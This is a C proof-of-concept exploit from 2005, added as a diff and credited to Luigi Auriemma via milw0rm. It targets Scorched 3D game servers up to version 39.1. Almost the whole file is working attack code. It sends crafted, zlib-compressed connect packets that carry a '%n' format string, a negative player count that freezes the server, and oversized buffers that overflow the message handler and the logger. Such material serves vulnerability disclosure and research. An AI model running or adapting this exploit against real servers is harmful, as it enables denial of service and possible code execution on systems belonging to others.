@@ -1,0 +1,535 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdarg.h>
+#include <time.h>
+#include <zlib.h>
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+// inserted winerr.h /str0ke
+
+    #define close   closesocket
+    #define ONESEC  1000
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+
+    #define ONESEC  1
+#endif
+
+
+
+#define VER         "0.1"
+#define PORT        27270
+#define BUFFSZ      0xffff
+#define TIMEOUT     5
+#define WAITSEC     5
+#define MAXSOCKS    32
+#define INFO        "status\0"
+#define VERTAG      "build "
+#define BOOMSZ      80000
+#define BOFSZ       2200    // 1024 buffer, we need more for Win compatibility
+
+
+
+u_char *do_it_big(int size);
+void scorched3d_info(u_char *data, u_char *version, u_char *pversion);
+void read_sock(int sock, u_char *buff, int max);
+int scorched3d_recv(int sd, u_char *pck, int pcksz, u_char *buff, int buffsz);
+void scorched3d_send(int sock, u_char *pck, int len, u_char *buff, int buffsz);
+int scorched3d_build_pck(u_char *buff, u_char *cmd, ...);
+int mycpy(u_char *dst, u_char *src);
+int unzip(u_char *in, int size, u_char *out, int maxsz);
+int zip(u_char *in, int size, u_char *out, int maxsz);
+int timeout(int sock);
+u_int resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    int     sd,
+            len,
+            attack;
+    u_short port = PORT;
+    u_char  numplayers[12],
+            password[256],
+            version[16],
+            pversion[16],
+            username[17],
+            *connmsg = "ComsConnectMessage",
+            *uid,
+            *buff,
+            *pck,
+            *msg,
+            *p,
+            *l;
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Scorched 3D <= 39.1 (bf) multiple vulnerabilities "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <attack> <host> [port(%hu)]\n"
+            "\n"
+            "Attacks:\n"
+            "1 = format string and buffer-overflow in addLine and SendString*\n"
+            "    (this PoC tests only the format string for simplicity\n"
+            "2 = server freeze through negative numplayers\n"
+            "    if server is protected with password you need to know the keyword\n"
+            "3 = ComsMessageHandler buffer-overflow\n"
+            "4 = various crashes and possible code execution in Logger.cpp\n"
+            "    if server is protected with password you need to know the keyword\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+    attack = atoi(argv[1]);
+    if(argc > 3) port = atoi(argv[3]);
+
+    peer.sin_addr.s_addr = resolv(argv[2]);
+    peer.sin_port        = htons(port + 1);
+    peer.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr), port);
+
+    buff = malloc(BUFFSZ + 1);
+    pck  = malloc(BUFFSZ + 1);
+    if(!buff || !pck) std_err();
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+    sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, sizeof(peer));
+    if(!timeout(sd)) {
+        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
+        if(len < 0) std_err();
+        buff[len] = 0;
+        scorched3d_info(buff, version, pversion);
+        printf("- set version %s (%s)\n", version, pversion);
+    } else {
+        strcpy(version,  "39.1");
+        strcpy(pversion, "bf");
+    }
+    close(sd);
+
+    fputs(
+        "- if you lost the connection probably the server is vulnerable\n"
+        "- start attack:\n", stdout);
+
+    uid = "";
+    strcpy(numplayers, "1");
+    password[0] = 0;
+
+    switch(attack) {
+        case 1: connmsg = "%n%n%n%n%n";         break;
+        case 2: strcpy(numplayers, "-1");       break;
+        case 3: connmsg = do_it_big(BOFSZ);     break;
+        case 4: uid     = do_it_big(BOOMSZ);    break;
+        default: {
+            printf("\nError: the attack %d is not available\n\n", attack);
+            exit(1);
+            } break;
+    }
+
+    peer.sin_port        = htons(port);
+    for(;;) {   // password handling
+        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if(sd < 0) std_err();
+        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
+          < 0) std_err();
+
+        sprintf(username, "%lx", time(NULL));
+
+        len = scorched3d_build_pck(pck,
+            connmsg,
+            "host",         "Linux",
+            "numplayers",   numplayers,
+            "password",     password,
+            "pversion",     pversion,
+            "uid",          uid,
+            "username",     username,
+            "version",      version,
+            NULL);
+
+        scorched3d_send(sd, pck, len, buff, BUFFSZ);
+
+        if(timeout(sd) < 0) {
+            fputs("\nError: socket timeout, the server has not replied to our request\n", stdout);
+            exit(1);
+        }
+
+        len = scorched3d_recv(sd, pck, BUFFSZ, buff, BUFFSZ);
+
+        if(!strcmp(buff, "ComsTextMessage")) {
+            msg = buff + 16;
+
+            if(strstr(msg, "password")) {
+                fputs("- server protected, insert the right password:\n  ", stdout);
+                fflush(stdin);
+                fgets(password, sizeof(password), stdin);
+                for(p = password; *p > '\r'; p++);
+                *p = 0;
+                close(sd);
+                continue;
+
+            } else if(strstr(msg, "version")) {
+                p = strstr(msg, VERTAG);
+                if(!p) {
+                    printf("\nError: no version found in the message:\n%s\n", msg);
+                    exit(1);
+                }
+                p += sizeof(VERTAG) - 1;
+
+                l = strchr(p, '(');
+                if(l) *(l - 1) = 0;
+                strcpy(version, p);
+
+                p = l + 1;
+                l = strchr(p, ')');
+                if(l) *l = 0;
+                strcpy(pversion, p);
+
+                printf("- set version %s (%s)\n", version, pversion);
+                close(sd);
+                continue;
+            }
+
+            printf("%s\n", buff + 16);
+            exit(1);
+        }
+
+        close(sd);
+        break;
+    }
+    return(0);
+}
+
+
+
+u_char *do_it_big(int size) {
+    u_char  *s;
+
+    s = malloc(size + 1);
+    if(!s) std_err();
+    memset(s, 'a', size);
+    s[size] = 0;
+    return(s);
+}
+
+
+
+void scorched3d_info(u_char *data, u_char *version, u_char *pversion) {
+    u_char  *p,
+            *par,
+            *val;
+
+    version[0]  = 0;
+    pversion[0] = 0;
+
+    p = strchr(data, ' ');
+    if(!p) return;
+
+    for(;;) {
+        data = p + 1;
+        if((*data == '/') || (*data == '>')) break;
+
+        p = strchr(data, '=');
+        if(!p) break;
+        *p = 0;
+        par = data;
+        data = p + 1;
+        if(*data == '\'') {
+            data++;
+            p = strchr(data, '\'');
+            if(p) *p = 0;
+        }
+        p = strchr(p + 1, ' ');
+        if(p) *p = 0;
+        val = data;
+
+        printf("%20s: %s\n", par, val);
+
+            // strcpy usage, not sanitized
+        if(!strcmp(par, "version")) {
+            strcpy(version, val);
+        } else if(!strcmp(par, "protocolversion")) {
+            strcpy(pversion, val);
+        }
+    }
+}
+
+
+
+void read_sock(int sd, u_char *buff, int max) {
+    int     t;
+
+    while(max) {
+        t = recv(sd, buff, max, 0);
+        if(t <= 0) std_err();
+        max -= t;
+    }
+}
+
+
+
+int scorched3d_recv(int sd, u_char *pck, int pcksz, u_char *buff, int buffsz) {
+    int     len,
+            unzlen;
+
+    read_sock(sd, (u_char *)&len, 4);
+    len = ntohl(len);
+
+    read_sock(sd, (u_char *)&unzlen, 4);
+    unzlen = ntohl(unzlen);
+
+    read_sock(sd, pck, len - 4);
+
+    if(unzlen > buffsz) return(0);
+    len = unzip(pck, pcksz, buff, unzlen);
+    return(len);
+}
+
+
+
+void scorched3d_send(int sd, u_char *pck, int len, u_char *buff, int buffsz) {
+    int     tmp,
+            zlen;
+
+    zlen = zip(pck, len, buff, buffsz);
+
+    tmp = htonl(zlen + 4);
+    if(send(sd, (void *)&tmp, 4, 0) < 0) std_err();
+
+    tmp = htonl(len);
+    if(send(sd, (void *)&tmp, 4, 0) < 0) std_err();
+
+    if(send(sd, buff, zlen, 0) < 0) std_err();
+}
+
+
+
+int scorched3d_build_pck(u_char *buff, u_char *cmd, ...) {
+    va_list ap;
+    int     num = 0,
+            *pnum;
+    u_char  *p,
+            *s;
+
+    p = buff;
+    p += mycpy(p, cmd);
+    pnum = (int *)p;
+    p += 4;
+
+    va_start(ap, cmd);
+    while((s = va_arg(ap, u_char *))) {
+        p += mycpy(p, s);
+        num++;
+    }
+    va_end(ap);
+
+    *pnum = htonl(num >> 1);
+    return(p - buff);
+}
+
+
+
+int mycpy(u_char *dst, u_char *src) {
+    u_char  *base = dst;
+
+    while(*src) *dst++ = *src++;
+    *dst++ = 0;
+    return(dst - base);
+}
+
+
+
+int unzip(u_char *in, int size, u_char *out, int maxsz) {
+    z_stream    z;
+    int         ret;
+
+    z.zalloc = (alloc_func)0;
+    z.zfree  = (free_func)0;
+    z.opaque = (voidpf)0;
+
+    if(inflateInit2(&z, 15)) {
+        fputs("\nError: zlib initialization error\n", stdout);
+        exit(1);
+    }
+
+    z.next_in   = in;
+    z.avail_in  = size;
+    z.next_out  = out;
+    z.avail_out = maxsz;
+    inflate(&z, Z_NO_FLUSH);
+
+    ret = z.total_out;
+    inflateEnd(&z);
+    return(ret);
+}
+
+
+
+int zip(u_char *in, int size, u_char *out, int maxsz) {
+    z_stream    z;
+    int         ret;
+
+    z.zalloc = (alloc_func)0;
+    z.zfree  = (free_func)0;
+    z.opaque = (voidpf)0;
+
+    if(deflateInit2(&z, Z_BEST_COMPRESSION, Z_DEFLATED, 15, 9, Z_DEFAULT_STRATEGY)) {
+        fputs("\nError: zlib initialization error\n", stdout);
+        exit(1);
+    }
+
+    z.next_in   = in;
+    z.avail_in  = size;
+    z.next_out  = out;
+    z.avail_out = maxsz;
+    deflate(&z, Z_FINISH);
+
+    ret = z.total_out;
+    deflateEnd(&z);
+    return(ret);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_int resolv(char *host) {
+    struct  hostent *hp;
+    u_int   host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolve hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_int *)(hp->h_addr);
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2005-11-02]
